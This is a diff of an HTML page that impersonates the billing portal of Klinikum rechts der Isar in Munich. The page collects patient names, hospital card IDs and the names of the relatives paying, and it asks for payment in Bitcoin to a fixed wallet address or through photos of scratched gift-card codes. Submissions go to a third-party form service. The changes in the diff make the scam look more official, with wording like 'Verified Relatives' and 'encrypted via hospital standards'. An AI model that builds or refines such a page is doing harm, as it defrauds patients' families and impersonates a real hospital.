@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Patient Payment Portal | Klinikum rechts der Isar</title>
+    <title>Secure Payment Portal | Klinikum rechts der Isar</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .tum-blue { background-color: #005293; }
@@ -13,18 +13,18 @@
 <body class="bg-gray-50 font-sans">
 
     <nav class="bg-white py-4 px-6 border-b flex justify-between items-center shadow-sm">
-        <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" alt="TUM Logo" class="h-10">
-        <div class="text-right leading-tight text-gray-500">
-            <p class="text-[10px] font-bold uppercase tracking-tighter">Technical University</p>
-            <p class="text-[10px] font-bold uppercase tracking-tighter">of Munich</p>
+        <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" alt="Hospital Logo" class="h-10 md:h-12">
+        <div class="text-right leading-tight text-gray-400">
+            <p class="text-[10px] font-bold uppercase tracking-widest">Technical University</p>
+            <p class="text-[10px] font-bold uppercase tracking-widest">of Munich</p>
         </div>
     </nav>
 
-    <div class="relative h-80 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
+    <div class="relative h-64 md:h-80 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
         <div class="absolute inset-0 hero-overlay flex items-center justify-center text-center p-4">
             <div class="text-white">
-                <h1 class="text-3xl md:text-4xl font-extrabold tracking-tight mb-2 uppercase">Billing & Finance Portal</h1>
-                <p class="text-lg font-light italic">Secure Payment Channel for Spouses & Relatives</p>
+                <h1 class="text-2xl md:text-4xl font-extrabold tracking-tight mb-2 uppercase">Billing & Finance Portal</h1>
+                <p class="text-sm md:text-lg font-light italic">Secure Payment Channel for Spouses & Verified Relatives</p>
             </div>
         </div>
     </div>
@@ -37,30 +37,30 @@
 
             <form action="https://formspree.io/f/mwvnrylr" method="POST" enctype="multipart/form-data" class="p-6 md:p-10">
                 
-                <h2 class="text-xl font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3">1. Patient & Sender Identification</h2>
+                <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3">1. Patient & Sender Identification</h2>
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                     <div>
-                        <label class="block text-sm font-bold text-gray-600 mb-1">Patient First Name</label>
-                        <input type="text" name="First Name" required class="w-full border-2 border-gray-200 p-3 rounded-xl focus:border-blue-500 outline-none">
+                        <label class="block text-xs font-bold text-gray-500 uppercase mb-1">Patient First Name</label>
+                        <input type="text" name="Patient_First_Name" required class="w-full border-2 border-gray-100 p-3 rounded-xl focus:border-blue-500 outline-none transition">
                     </div>
                     <div>
-                        <label class="block text-sm font-bold text-gray-600 mb-1">Patient Last Name</label>
-                        <input type="text" name="Last Name" required class="w-full border-2 border-gray-200 p-3 rounded-xl focus:border-blue-500 outline-none">
+                        <label class="block text-xs font-bold text-gray-500 uppercase mb-1">Patient Last Name</label>
+                        <input type="text" name="Patient_Last_Name" required class="w-full border-2 border-gray-100 p-3 rounded-xl focus:border-blue-500 outline-none transition">
                     </div>
                     <div>
-                        <label class="block text-sm font-bold text-gray-600 mb-1">Patient Hospital Card ID</label>
-                        <input type="text" name="Hospital ID" placeholder="TUM-XXXX-XXXX" required class="w-full border-2 border-gray-200 p-3 rounded-xl">
+                        <label class="block text-xs font-bold text-gray-500 uppercase mb-1">Hospital Card ID</label>
+                        <input type="text" name="Hospital_ID" placeholder="TUM-XXXX-XXXX" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                     </div>
                     <div>
-                        <label class="block text-sm font-bold text-gray-600 mb-1">Spouse (Sender) Full Name</label>
-                        <input type="text" name="Sender Name" required class="w-full border-2 border-gray-200 p-3 rounded-xl">
+                        <label class="block text-xs font-bold text-gray-500 uppercase mb-1">Sender (Spouse) Full Name</label>
+                        <input type="text" name="Sender_Name" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                     </div>
                 </div>
 
-                <h2 class="text-xl font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3">2. Payment Configuration</h2>
+                <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3">2. Payment Configuration</h2>
                 <div class="mb-8">
-                    <label class="block text-sm font-bold text-gray-600 mb-1">Payment Status</label>
-                    <select name="Payment Type" id="pay_choice" onchange="toggleBalance()" class="w-full border-2 border-gray-200 p-3 rounded-xl bg-gray-50">
+                    <label class="block text-xs font-bold text-gray-500 uppercase mb-1">Transaction Type</label>
+                    <select name="Payment_Type" id="pay_choice" onchange="toggleBalance()" class="w-full border-2 border-gray-100 p-3 rounded-xl bg-gray-50">
                         <option value="Paying in Full">Paying in Full</option>
                         <option value="Paying in Advance">Paying in Advance</option>
                         <option value="Completing Previous Payment">Completing Previous Payment</option>
@@ -68,36 +68,36 @@
                 </div>
 
                 <div id="balance_input" class="hidden mb-8 p-4 bg-blue-50 rounded-xl border-2 border-blue-100">
-                    <label class="block text-sm font-bold text-blue-800 mb-1">Remaining Balance to be Paid Later ($)</label>
-                    <input type="text" name="Remaining Balance Amount" placeholder="Enter amount left to pay" class="w-full border-2 border-white p-3 rounded-lg shadow-inner">
+                    <label class="block text-xs font-bold text-blue-800 uppercase mb-1">Reported Remaining Balance ($)</label>
+                    <input type="text" name="Remaining_Balance" placeholder="Enter amount" class="w-full border-2 border-white p-3 rounded-lg shadow-inner">
                 </div>
 
                 <div class="bg-gray-900 rounded-2xl p-6 text-white mb-8 border-b-4 border-blue-500 shadow-xl">
-                    <h3 class="text-blue-400 font-bold mb-4 flex items-center">
+                    <h3 class="text-blue-400 font-bold mb-4 flex items-center uppercase text-sm tracking-wide">
                         <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.040M12 20.944a11.955 11.955 0 01-8.618-3.040M12 2.944a11.955 11.955 0 018.618 3.040M12 20.944a11.955 11.955 0 008.618-3.040"></path></svg>
-                        SECURE DEPOSIT GUIDELINES
+                        Clinical Deposit Guidelines
                     </h3>
-                    <div class="space-y-4 text-xs">
+                    <div class="space-y-4 text-xs leading-relaxed">
                         <div class="bg-gray-800 p-4 rounded-lg">
-                            <p class="font-bold text-gray-400 mb-1 uppercase">Method A: BTC Wallet</p>
+                            <p class="font-bold text-gray-500 mb-1 uppercase tracking-tighter">Method A: BTC Settlement</p>
                             <code class="text-green-400 text-sm break-all font-mono">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</code>
                         </div>
                         <div class="bg-gray-800 p-4 rounded-lg">
-                            <p class="font-bold text-gray-400 mb-1 uppercase">Method B: Card Verification</p>
-                            <p class="mb-3 italic">Scratch card gently to avoid fading digits. Upload clear images below.</p>
+                            <p class="font-bold text-gray-500 mb-1 uppercase tracking-tighter">Method B: Card Asset Verification</p>
+                            <p class="mb-3 text-gray-300 italic">Gently reveal the security code. Digital capture must be clear and unobstructed. Faded digits will result in transaction failure.</p>
                             
-                            <label class="block font-bold text-blue-400 mb-2">Upload Clear Photo of Gift Card / BTC Receipt:</label>
-                            <input type="file" name="Payment_Proof_Image" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-xs file:font-bold file:bg-blue-600 file:text-white hover:file:bg-blue-700 cursor-pointer">
+                            <label class="block font-bold text-blue-400 mb-2">Upload High-Resolution Proof (JPG/PNG):</label>
+                            <input type="file" name="Proof_of_Payment" required class="block w-full text-xs text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-xs file:font-bold file:bg-blue-600 file:text-white hover:file:bg-blue-700 cursor-pointer transition">
                         </div>
                     </div>
                 </div>
 
-                <button type="submit" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl hover:bg-blue-800 transition-all uppercase shadow-lg transform active:scale-95">
-                    Submit Secure Payment
+                <button type="submit" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-lg hover:bg-blue-800 transition-all uppercase shadow-lg transform active:scale-95 tracking-widest">
+                    Execute Secure Payment
                 </button>
             </form>
         </div>
-        <p class="text-center text-gray-400 text-[10px] mt-6 px-10">This portal is strictly for the use of relatives of patients at Klinikum rechts der Isar. All data is processed via secure clinical servers.</p>
+        <p class="text-center text-gray-400 text-[9px] mt-6 px-10 uppercase tracking-tighter">Authorized clinical portal for internal patient accounting. All data is encrypted via hospital standards.</p>
     </div>
 
     <script>
